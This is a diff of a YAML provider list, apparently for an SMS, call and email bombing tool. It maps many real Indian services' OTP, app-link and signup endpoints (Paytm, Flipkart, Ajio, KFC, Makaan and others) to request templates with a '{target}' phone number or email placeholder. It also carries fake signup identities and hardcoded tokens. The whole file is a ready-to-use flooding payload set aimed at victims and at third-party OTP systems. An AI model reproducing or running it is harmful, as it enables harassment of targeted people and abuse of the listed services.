@@ -1,92 +1,223 @@
 # SPDX-License-Identifier: GPL-3.0-or-later
 
-providers:
+sms:
   '91':
-    - name: justdial
-      method: GET
-      url: https://t.justdial.com/api/india_api_write/18july2018/sendvcode.php
+    - name: "housing"
+      method: "POST"
+      url: "https://login.housing.com/api/v2/send-otp"
+      data_type: "json"
+      headers:
+        "Content-Type": "application/json"
+        "Origin": "https://housing.com"
+      data:
+        phone: "{target}"
+      identifier: "sent"
+
+    - name: "allensolly"
+      method: "POST"
+      url: "https://www.allensolly.com/capillarylogin/validateMobileOrEMail"
+      data:
+        mobileoremail: "{target}"
+        name: "markluther"
+
+    - name: "frotels"
+      method: "POST"
+      url: "https://www.frotels.com/appsendsms.php"
+      data:
+        mobno: "{target}"
+
+    - name: "gapoon"
+      method: "POST"
+      url: "https://www.gapoon.com/userSignup"
+      data:
+        mobile: "{target}"
+        email: "noreply@gmail.com"
+        name: "LexLuthor"
+
+    - name: "porter"
+      method: "POST"
+      url: "https://porter.in/restservice/send_app_link_sms"
+      data:
+        phone: "{target}"
+        referrer_string: ""
+        brand: "porter"
+
+    - name: "cityflo"
+      method: "POST"
+      url: "https://cityflo.com/website-app-download-link-sms/"
+      data:
+        mobile_number: "{target}"
+
+    - name: "nnnow"
+      method: "POST"
+      url: "https://api.nnnow.com/d/api/appDownloadLink"
+      data:
+        mobileNumber: "{target}"
+
+    - name: "ajio"
+      method: "POST"
+      url: "https://login.web.ajio.com/api/auth/signupSendOTP"
+      data:
+        firstName: "xxps"
+        login: "wiqpdl223@wqew.com"
+        password: "QASpw@1s"
+        genderType: "Male"
+        mobileNumber: "{target}"
+        requestType: "SENDOTP"
+
+    - name: "happyeasygo"
+      method: "GET"
+      url: "https://www.happyeasygo.com/heg_api/user/sendRegisterOTP.do"
       params:
-        mobile: '{target}'
-      identifier: 'sent'
+        phone: "91%20{target}"
 
-    - name: housing
-      method: POST
-      url: https://login.housing.com/api/v2/send-otp
-      data_type: json
-      headers:
-        Content-Type: application/json
-        Origin: https://housing.com
+    - name: "unacademy"
+      method: "POST"
+      url: "https://unacademy.com/api/v1/user/get_app_link/"
       data:
-        phone: '{target}'
-      identifier: 'sent'
+        phone: "{target}"
 
-    - name: pharmeasy
-      method: POST
-      url: https://pharmeasy.in/api/auth/requestOTP
-      data_type: json
-      headers:
-        User-Agent: Mozilla/5.0
-        Origin: https://pharmeasy.in
+    - name: "treebo"
+      method: "POST"
+      url: "https://www.treebo.com/api/v2/auth/login/otp/"
       data:
-        contactNumber: '{target}'
-      identifier: 'resendSmsCounter'
+        phone_number: "{target}"
 
-    - name: confirmtkt
-      method: GET
-      url: https://securedapi.confirmtkt.com/api/platform/register
+    - name: "airtel"
+      method: "GET"
+      url: "https://www.airtel.in/referral-api/core/notify"
       params:
-        newOtp: 'true'
-        mobile_number: '{target}'
-      identifier: 'false'
+        messageId: "map"
+        rtn: "{target}"
 
-    - name: myupchar
-      method: GET
-      url: https://www.myupchar.com/consultation/store_otp
+    - name: "pharmeasy"
+      method: "POST"
+      url: "https://pharmeasy.in/api/auth/requestOTP"
+      data_type: "json"
+      data:
+        contactNumber: "{target}"
+
+    - name: "mylescars"
+      method: "POST"
+      url: "https://www.mylescars.com/usermanagements/chkContact"
+      data:
+        contactNo: "{target}"
+
+    - name: "grofers"
+      method: "POST"
+      url: "https://grofers.com/v2/accounts/"
+      data:
+        user_phone: "{target}"
       headers:
-        User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:79.0) Gecko/20100101 Firefox/79.0
-        X-Requested-With: XMLHttpRequest
-        Referer: https://www.myupchar.com/consultation/query
+        auth_key: "3f0b81a721b2c430b145ecb80cfdf51b170bf96135574e7ab7c577d24c45dbd7"
+
+    - name: "dream11"
+      method: "POST"
+      url: "https://api.dream11.com/sendsmslink"
+      data:
+        siteId: "1"
+        mobileNum: "{target}"
+        appType: "androidfull"
+
+    - name: "cashify"
+      method: "GET"
+      url: "https://www.cashify.in/api/cu01/v1/app-link"
       params:
-        phone: '{target}'
-      identifier: 'आपके मोबाइल नंबर पर OTP भेज दिया गया है।'
+        mn: "{target}"
 
-    - name: ajio
-      method: POST
-      url: https://login.web.ajio.com/api/auth/signupSendOTP
+    - name: "paytm"
+      method: "POST"
+      url: "https://commonfront.paytm.com/v4/api/sendsms"
       data:
-        firstName: Aadit
-        login: techyfatcat@gmail.com
-        password: Password@123
-        genderType: Male
-        mobileNumber: '{target}'
-        requestType: SENDOTP
-      identifier: '1'
+        phone: "{target}"
+        guid: "2952fa812660c58dc160ca6c9894221d"
 
-    - name: paytm
-      method: POST
-      url: https://commonfront.paytm.com/v4/api/sendsms
-      data_type: json
-      data:
-        phone: '{target}'
-        guid: 2952fa812660c58dc160ca6c9894221d
-      identifier: '202'
-
-  multi:
-    - name: flipkart
-      method: POST
-      cc_target: loginId
-      url: https://www.flipkart.com/api/5/user/otp/generate
+    - name: "kfc-in"
+      method: "POST"
+      url: "https://online.kfc.co.in/OTP/ResendOTPToPhoneForLogin"
+      data_type: "json"
       headers:
-        X-user-agent: Mozilla/5.0 (X11; Linux x86_64) FKUA/website/41/Desktop
-        Origin: https://www.flipkart.com
-        Content-Type: application/x-www-form-urlencoded
+        "Referer": "https://online.kfc.co.in/login"
+        "__RequestVerificationToken": "-zoQqa7WNa3z-mwOyqWHvcyYkCqYv0h7zqNUAqBivokB75ZiDj-LwQsGk4kB8QextV396CRJxxPAsWXfwYMoPFhMVlQBd1V0ONFeIrpj2C81:ub34fZv2vHPnub-TuF-vkK4rAkfKmIgnZFscecZJ3-kzvRU9CktNjLyLOCFNsixxFGbotqULbV41iHU2K-G0Aoqd4P4MQqIsjJm8tFkZga01"
       data:
-        loginId: +{target}
-      identifier: emailMask
+        AuthorizedFor: "3"
+        phoneNumber: "{target}"
+        Resend: "false"
 
-    - name: gotinder
-      method: POST
-      url: https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru
+    - name: "indialends"
+      method: "POST"
+      url: "https://indialends.com/internal/a/mobile-verification_v2.ashx"
+      headers:
+        "Referer": "https://indialends.com/personal-loan"
       data:
-        phone_number: '{cc}{target}'
-      identifier: '200'
+        aeyder03teaeare: "1"
+        ertysvfj74sje: "91"
+        jfsdfu14hkgertd: "{target}"
+        lj80gertdfg: "0"
+
+    - name: "flipkart"
+      method: "POST"
+      url: "https://www.flipkart.com/api/5/user/otp/generate"
+      data:
+        loginId: "+91{target}"
+      headers:
+        "X-user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+        "Origin": "https://www.flipkart.com"
+
+    - name: "redbus"
+      method: "GET"
+      url: "https://m.redbus.in/api/getOtp"
+      params:
+        number: "{target}"
+        cc: "91"
+        whatsAppOpted: false
+
+call:
+  '91':
+    - name: "makaan"
+      method: "GET"
+      url: "https://www.makaan.com/apis/nc/sendOtpOnCall/16257065/{target}"
+      params:
+        callType: "otpOnCall"
+
+    - name: "realestate"
+      method: "POST"
+      url: "https://www.realestateindia.com/mobile-script/indian_mobile_verification_form.php"
+      params:
+        sid: "0.5983221395805354"
+      data:
+        action_id: "call_to_otp"
+        mob_num: "{target}"
+        member_id: "1547045"
+
+    - name: "magicbricks"
+      method: "GET"
+      url: "https://api.magicbricks.com/bricks/verifyOnCall.html"
+      params:
+        mobile: "{target}"
+
+    - name: "career360"
+      method: "POST"
+      url: "https://www.careers360.com/ajax/no-cache/user/otp-send"
+      headers:
+        "X-Requested-With": "XMLHttpRequest"
+      data:
+        mobile_number: "{target}"
+        method: "call"
+        uid: "12692588"
+
+email:
+  - name: "themezee"
+    method: "POST"
+    url: "https://themezee.com/wp-admin/admin-ajax.php?action=mc4wp-form"
+    data:
+      EMAIL: "{target}"
+      AGREE: "1"
+
+  - name: "credible_init"
+    method: "POST"
+    url: "https://mycredible.info:443/mycredible/signup"
+    data:
+      email: "{target}"
+      first_name: "Lex"
+      last_name: "Luthor"
